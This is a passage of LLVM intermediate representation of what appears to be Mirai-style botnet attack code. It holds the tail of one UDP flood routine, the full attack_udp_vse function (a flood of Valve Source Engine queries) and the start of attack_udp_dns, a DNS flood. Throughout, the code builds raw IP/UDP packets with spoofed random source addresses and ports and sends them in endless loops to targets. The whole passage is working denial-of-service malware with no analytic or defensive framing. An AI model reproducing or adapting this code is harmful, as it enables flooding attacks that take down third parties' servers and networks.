  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 2
  %196 = load i8, i8* %195, align 4
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %197, 32
  br i1 %198, label %199, label %220

; <label>:199:                                    ; preds = %177
  %200 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i32 0, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = call i32 @ntohl(i32 %205) #7
  %207 = call i32 @rand_next()
  %208 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 2
  %213 = load i8, i8* %212, align 4
  %214 = zext i8 %213 to i32
  %215 = lshr i32 %207, %214
  %216 = add i32 %206, %215
  %217 = call i32 @htonl(i32 %216) #7
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  br label %220

; <label>:220:                                    ; preds = %199, %177
  %221 = load i32, i32* %20, align 4
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %223, label %227

; <label>:223:                                    ; preds = %220
  %224 = call i32 @rand_next()
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 8
  store i32 %224, i32* %226, align 4
  br label %227

; <label>:227:                                    ; preds = %223, %220
  %228 = load i16, i16* %13, align 2
  %229 = zext i16 %228 to i32
  %230 = icmp eq i32 %229, 65535
  br i1 %230, label %231, label %236

; <label>:231:                                    ; preds = %227
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 3
  store i16 %233, i16* %235, align 4
  br label %236

; <label>:236:                                    ; preds = %231, %227
  %237 = load i16, i16* %16, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  br i1 %239, label %240, label %245

; <label>:240:                                    ; preds = %236
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 0
  store i16 %242, i16* %244, align 2
  br label %245

; <label>:245:                                    ; preds = %240, %236
  %246 = load i16, i16* %17, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  br i1 %248, label %249, label %254

; <label>:249:                                    ; preds = %245
  %250 = call i32 @rand_next()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i32 0, i32 1
  store i16 %251, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %249, %245
  %255 = load i8, i8* %19, align 1
  %256 = icmp ne i8 %255, 0
  br i1 %256, label %257, label %261

; <label>:257:                                    ; preds = %254
  %258 = load i8*, i8** %26, align 8
  %259 = load i16, i16* %18, align 2
  %260 = zext i16 %259 to i32
  call void @rand_str(i8* %258, i32 %260)
  br label %261

; <label>:261:                                    ; preds = %257, %254
  %262 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 7
  store i16 0, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = bitcast %struct.iphdr* %264 to i16*
  %266 = call zeroext i16 @checksum_generic(i16* %265, i32 20)
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 7
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 3
  store i16 0, i16* %270, align 2
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %273 = bitcast %struct.udphdr* %272 to i8*
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %274, i32 0, i32 2
  %276 = load i16, i16* %275, align 2
  %277 = load i16, i16* %18, align 2
  %278 = zext i16 %277 to i64
  %279 = add i64 8, %278
  %280 = trunc i64 %279 to i32
  %281 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %271, i8* %273, i16 zeroext %276, i32 %280)
  %282 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i32 0, i32 3
  store i16 %281, i16* %283, align 2
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 1
  %286 = load i16, i16* %285, align 2
  %287 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %288 = load i32, i32* %9, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %290, i32 0, i32 0
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %291, i32 0, i32 1
  store i16 %286, i16* %292, align 2
  %293 = load i32, i32* %10, align 4
  %294 = load i8*, i8** %23, align 8
  %295 = load i16, i16* %18, align 2
  %296 = zext i16 %295 to i64
  %297 = add i64 28, %296
  %298 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = bitcast %struct.sockaddr_in* %303 to %struct.sockaddr*
  store %struct.sockaddr* %304, %struct.sockaddr** %298, align 8
  %305 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %306 = load %struct.sockaddr*, %struct.sockaddr** %305, align 8
  %307 = call i64 @sendto(i32 %293, i8* %294, i64 %297, i32 16384, %struct.sockaddr* %306, i32 16)
  br label %308

; <label>:308:                                    ; preds = %261
  %309 = load i32, i32* %9, align 4
  %310 = add nsw i32 %309, 1
  store i32 %310, i32* %9, align 4
  br label %172

; <label>:311:                                    ; preds = %172
  br label %171

; <label>:312:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 29)
  %55 = call i8* @table_retrieve_val(i32 29, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %288

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %288

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %160, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %163

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = and i8 %93, 15
  %95 = or i8 %94, 64
  store i8 %95, i8* %92, align 4
  %96 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %97 = bitcast %struct.iphdr* %96 to i8*
  %98 = load i8, i8* %97, align 4
  %99 = and i8 %98, -16
  %100 = or i8 %99, 5
  store i8 %100, i8* %97, align 4
  %101 = load i8, i8* %12, align 1
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i32 0, i32 1
  store i8 %101, i8* %103, align 1
  %104 = load i32, i32* %19, align 4
  %105 = sext i32 %104 to i64
  %106 = add i64 32, %105
  %107 = trunc i64 %106 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #7
  %109 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  store i16 %108, i16* %110, align 2
  %111 = load i16, i16* %13, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %111) #7
  %113 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 3
  store i16 %112, i16* %114, align 4
  %115 = load i8, i8* %14, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 5
  store i8 %115, i8* %117, align 4
  %118 = load i8, i8* %15, align 1
  %119 = icmp ne i8 %118, 0
  br i1 %119, label %120, label %124

; <label>:120:                                    ; preds = %73
  %121 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %122 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 4
  store i16 %121, i16* %123, align 2
  br label %124

; <label>:124:                                    ; preds = %120, %73
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 6
  store i8 17, i8* %126, align 1
  %127 = load i32, i32* @LOCAL_ADDR, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 8
  store i32 %127, i32* %129, align 4
  %130 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 9
  store i32 %135, i32* %137, align 4
  %138 = load i16, i16* %16, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %138) #7
  %140 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i32 0, i32 0
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %17, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 1
  store i16 %143, i16* %145, align 2
  %146 = load i32, i32* %19, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 12, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %152 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i8*, i8** %22, align 8
  %154 = bitcast i8* %153 to i32*
  store i32 -1, i32* %154, align 4
  %155 = load i8*, i8** %22, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 4
  store i8* %156, i8** %22, align 8
  %157 = load i8*, i8** %22, align 8
  %158 = load i8*, i8** %18, align 8
  %159 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %157, i8* %158, i32 %159)
  br label %160

; <label>:160:                                    ; preds = %124
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %68

; <label>:163:                                    ; preds = %68
  br label %164

; <label>:164:                                    ; preds = %287, %163
  store i32 0, i32* %9, align 4
  br label %165

; <label>:165:                                    ; preds = %284, %164
  %166 = load i32, i32* %9, align 4
  %167 = load i8, i8* %5, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp slt i32 %166, %168
  br i1 %169, label %170, label %287

; <label>:170:                                    ; preds = %165
  %171 = load i8**, i8*** %11, align 8
  %172 = load i32, i32* %9, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8*, i8** %171, i64 %173
  %175 = load i8*, i8** %174, align 8
  store i8* %175, i8** %23, align 8
  %176 = load i8*, i8** %23, align 8
  %177 = bitcast i8* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %24, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i64 1
  %180 = bitcast %struct.iphdr* %179 to %struct.udphdr*
  store %struct.udphdr* %180, %struct.udphdr** %25, align 8
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %187, 32
  br i1 %188, label %189, label %210

; <label>:189:                                    ; preds = %170
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 %195) #7
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 %206) #7
  %208 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  store i32 %207, i32* %209, align 4
  br label %210

; <label>:210:                                    ; preds = %189, %170
  %211 = load i16, i16* %13, align 2
  %212 = zext i16 %211 to i32
  %213 = icmp eq i32 %212, 65535
  br i1 %213, label %214, label %219

; <label>:214:                                    ; preds = %210
  %215 = call i32 @rand_next()
  %216 = trunc i32 %215 to i16
  %217 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 3
  store i16 %216, i16* %218, align 4
  br label %219

; <label>:219:                                    ; preds = %214, %210
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i32
  %222 = icmp eq i32 %221, 65535
  br i1 %222, label %223, label %228

; <label>:223:                                    ; preds = %219
  %224 = call i32 @rand_next()
  %225 = trunc i32 %224 to i16
  %226 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  store i16 %225, i16* %227, align 2
  br label %228

; <label>:228:                                    ; preds = %223, %219
  %229 = load i16, i16* %17, align 2
  %230 = zext i16 %229 to i32
  %231 = icmp eq i32 %230, 65535
  br i1 %231, label %232, label %237

; <label>:232:                                    ; preds = %228
  %233 = call i32 @rand_next()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  br label %237

; <label>:237:                                    ; preds = %232, %228
  %238 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = bitcast %struct.iphdr* %240 to i16*
  %242 = call zeroext i16 @checksum_generic(i16* %241, i32 20)
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 7
  store i16 %242, i16* %244, align 2
  %245 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 3
  store i16 0, i16* %246, align 2
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %249 = bitcast %struct.udphdr* %248 to i8*
  %250 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  %252 = load i16, i16* %251, align 2
  %253 = load i32, i32* %19, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 12, %254
  %256 = trunc i64 %255 to i32
  %257 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %247, i8* %249, i16 zeroext %252, i32 %256)
  %258 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 3
  store i16 %257, i16* %259, align 2
  %260 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %263, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 0
  %268 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %267, i32 0, i32 1
  store i16 %262, i16* %268, align 2
  %269 = load i32, i32* %10, align 4
  %270 = load i8*, i8** %23, align 8
  %271 = load i32, i32* %19, align 4
  %272 = sext i32 %271 to i64
  %273 = add i64 32, %272
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %275 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  store %struct.sockaddr* %280, %struct.sockaddr** %274, align 8
  %281 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %282 = load %struct.sockaddr*, %struct.sockaddr** %281, align 8
  %283 = call i64 @sendto(i32 %269, i8* %270, i64 %273, i32 16384, %struct.sockaddr* %282, i32 16)
  br label %284

; <label>:284:                                    ; preds = %237
  %285 = load i32, i32* %9, align 4
  %286 = add nsw i32 %285, 1
  store i32 %286, i32* %9, align 4
  br label %165

; <label>:287:                                    ; preds = %165
  br label %164

; <label>:288:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %396

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %396

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
